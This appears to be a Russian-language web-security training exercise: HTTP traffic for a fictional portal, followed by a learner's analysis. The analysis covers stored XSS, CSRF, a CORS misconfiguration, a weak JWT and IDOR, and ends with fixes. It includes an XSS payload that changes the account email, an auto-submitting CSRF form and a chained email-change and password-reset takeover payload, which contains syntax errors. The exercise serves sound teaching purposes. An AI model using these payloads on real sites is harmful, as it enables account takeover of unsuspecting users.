Задача:

1. Определите все уязвимости, присутствующие в представленных запросах и ответах.
2. Для каждой уязвимости опишите: тип уязвимости, шаги эксплуатации и фактический риск (последствия успешной экплуатации).
3. Опишите цепочку эксплуатации, позволяющую захватить произвольную учётную запись.
4. Приведите рекомендации по устранению каждой найденной уязвимости.

Запрос 1 — Обновление профиля:
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/json
Origin: https://portal.targetcorp.com

```
{"display_name": "<img src=x onerror=alert(document.domain)>", "bio": "Test user"}
```

Ответ 1:
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://portal.targetcorp.com
Access-Control-Allow-Credentials: true
 
{"status": "ok", "message": "Profile updated"}

-----------------------------------------------------------------------------------------------------------------
Запрос 2 — Просмотр профиля пользователя:
GET /profile/105 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123


Ответ 2:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express

 ```
 <!DOCTYPE html>
<html>
<head><title>User Profile</title></head>
<body>
 <div class="profile-card">
   <h2><img src=x onerror=alert(document.domain)></h2>
   <p class="bio">Test user</p>
   <p class="uid">User ID: 105</p>
  </div>
</body>
</html>
 ```


-----------------------------------------------------------------------------------------------------------------
Запрос 3 — Смена email:
POST /api/v1/account/change-email HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/x-www-form-urlencoded
Origin: https://portal.targetcorp.com
 
new_email=attacker@evil.com


Ответ 3:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"status": "ok", "message": "Email changed to attacker@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 4 — Смена email (с другого домена):
POST /api/v1/account/change-email HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/x-www-form-urlencoded
Origin: https://evil-site.com
Referer: https://evil-site.com/csrf.html
 
new_email=hacked@evil.com


Ответ 4:
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: https://evil-site.com
Access-Control-Allow-Credentials: true
 
{"status": "ok", "message": "Email changed to hacked@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 5 — Сброс пароля:
POST /api/v1/account/reset-password HTTP/1.1
Host: portal.targetcorp.com
Content-Type: application/json
 
{"email": "hacked@evil.com"}


Ответ 5:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"status": "ok", "message": "Password reset link sent to hacked@evil.com"}

-----------------------------------------------------------------------------------------------------------------
Запрос 6 — Просмотр профиля другого пользователя:
GET /api/v1/profile/1 HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123


Ответ 6:
HTTP/1.1 200 OK
Content-Type: application/json
 
{"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
 "role": "administrator", "display_name": "Admin User",
 "last_login": "2025-03-15T10:30:00Z"}




1 - На мой взгляд стоит рассматривать запросы 1 и 2 в совокупности потому что там отражена первая уязвимость, а именно Stored XSS, это произошло потому что парсер внутри Node.js, просто вставил пользовательский ввод, чего быть не должно, в результате мы получаем такую уязвимость
Шаги Эксплуатации:
Так как WAF пропустил запрос полностью, мне кажется можно не использовать техники для его обхода, поэтому я предложу payload с HackTricks `<img src=x onerror=fetch('/api/v1/account/change-email', {method:'POST', body:'new_email=hacked@evil.com'})>`, по факту можем сразу можем поменять почту потому что это sameorigin
Риск:
Выполнение произвольного JavaScript на клиенте
2 - Так же в ответе 2 присутствует Information Disclosur, а именно в том моменте когда мы видим заголовок X-Powered-By: Express, что указывает на то, что сервер организации работает на Node.js 
Шаги Эксплуатации:
Как таковых шагов нет, только если узнаем конкретную версию поищем актуальные CVE, может получиться что то найти
Риск:
Очень сильно зависит от версии Node.js
3 - В запросах 1-6 фигурирует очень странная подпись JWT токена
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123 
{ "alg": "HS256"} {"uid": 105,"username": "attacker","role": "user"}, подпись очень короткая, для HS256, по моему она больше 30+ или 32+ символов, попробовал сделать брутфорс по rockyou, и результатов не дало, возможно это просто заглушка а не подпись. 
Шаги эксплуатации
Можно попробовать классическую JWT атаку `"alg": "none"`  если сервер не проверяет подпись можем изменить значение и попробовать отправить хотя у нас уже пользователь с админскими правами
Риск:
Подмена сессии, повышении привилегий
4 - в POST запросах отсутствует CSRF токен, я честно не до конца прошел еще эту тему, поэтому буду судить по тому что я читаю, можно сказать что работает примерно так, сервер проверяет только куку если она валидна то меняет email, и тут уязвимость в том что сервер не знает сделал ли это пользователь или чужой сайт
Шаги эксплуатации:
Скидываем пользователю сайта portal.targetcorp.com ссылку на https://evil-site.com там предварительно кладем такую страницу:
```
<html> <body> <form method="POST" action="https://portal.targetcorp.com/api/v1/account/change-email" enctype="application/x-www-form-urlencoded"> <input type="hidden" name="new_email" value="hacked@evil.com"> </form> <script>document.forms[0].submit()</script> </body> </html>
```
Как только пользователь открыл страницу то сразу отправится запрос на смену почты, по идее это отражено в 4 запросе и атака пройдет, можно сделать и не в слепую, потому что присутствуют Access-Control-Allow-Origin: https://evil-site.com
Access-Control-Allow-Credentials: true, то есть мы можем читать ответы от сервиса на нашем https://evil-site.com 
5 - Ошибка конфигурации CORS, здесь cors позволяет читать ответы от https://evil-site.com от https://portal.targetcorp.com, 
Риск - обход sameorigin policy
6 - IDOR в 6 запросе по идее мы имеем пользователя с id=105 (из 2 запроса GET /profile/105 HTTP/1.1 и jwt), а получить доступ можем к данным пользователя с id=1
Шаги эксплуатации
Запрос на `GET /api/v1/profile/* HTTP/1.1` ведет к компрометации пользователей, это раскрывает их данные: {"uid": 1, "username": "admin", "email": "admin@targetcorp.com",
 "role": "administrator", "display_name": "Admin User",
 "last_login": "2025-03-15T10:30:00Z"} что открывает возможности для соц инженерии или подделки JWT токена
 Риски - раскрытие данных аккаунтов пользователей

Цепочка эксплуатации для захвата произвольного аккаунта:
Если бы мне нужен был захват произвольного аккаунта максимально быстро, и теория про JWT что .xYz123 это просто заглушка верна, тогда я бы использовал вектор IDOR -> JWT issue -> account take over, если вдруг на самом деле это какой то кастомный алгоритм проверки подписи можно использовать Stored XSS, тогда цепочка будет примерно такая 
Stored XSS -> email Change -> Paswword Reset -> account take over, но это сработает только при посещении нашего профиля, эксплоит будет выглядеть примерно так: 
```
Запрос 1 — Обновление профиля:
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEwNSwidXNlcm5hbWUiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.xYz123
Content-Type: application/json
Origin: https://portal.targetcorp.com


{"display_name": "<img src=x onerror=\"fetch('/api/v1/account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_email=attacker@evil.com'}).then(()=>fetch('/api/v1/account/reset-password',{method:'POST',headers:{'Content-Type':'application/json'},body: JSON..stringify({email: 'attacker@evil.com'})})))", "bio": "Test user"}
```
Когда пользователь посещает страницу тогда автоматически меняем почту и сбрасываем пароль

Приведите рекомендации по устранению каждой найденной уязвимости
1. StoredXSS возникает из за того что ввод пользователя попадает в html без экранирования, тогда если рендерит сервер нужно использовать экранирование при выводе, например использовать подобную функцию для санитизации вывода
```
const escapeHtml = (unsafe) => {return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#x27;");}; 
```
либо какие то встроенные функции для санитизации, так же еще можно попробовать ограничить длину вводимого имени, можно еще попробовать поставить CSP с 'self' чтобы убрать работу внутренних скриптов в html 
2. Для предотвращения Information Disclosur следует отключить отображение заголовка, либо как то отрезать все заголовки безопасности на этапе middleware, в лог допустим сохранять но пользователю не отдавать
3. JWT использовать криптостойкий секрет, а не заглушку, потому что сейчас подпись больше похожа на заглушку, и если моя теория про `alg:none` верна то добавить обязательную проверку алгоритма на входе
4. Необходимо добавить CSRF для всех методов, чтобы избежать несанкционированных действий от имени пользователя 
5. Для CORS я бы добавил просто белый лист разрешенных доменов, чтобы исключить автоматическую подстановку cookie браузером
6. IDOR возникает если сервер не проверяет имеет ли субъект доступ к объекту доступа, можно добавить проверку, например если requst.userId == page.userId разрешить доступ в ином случае 403 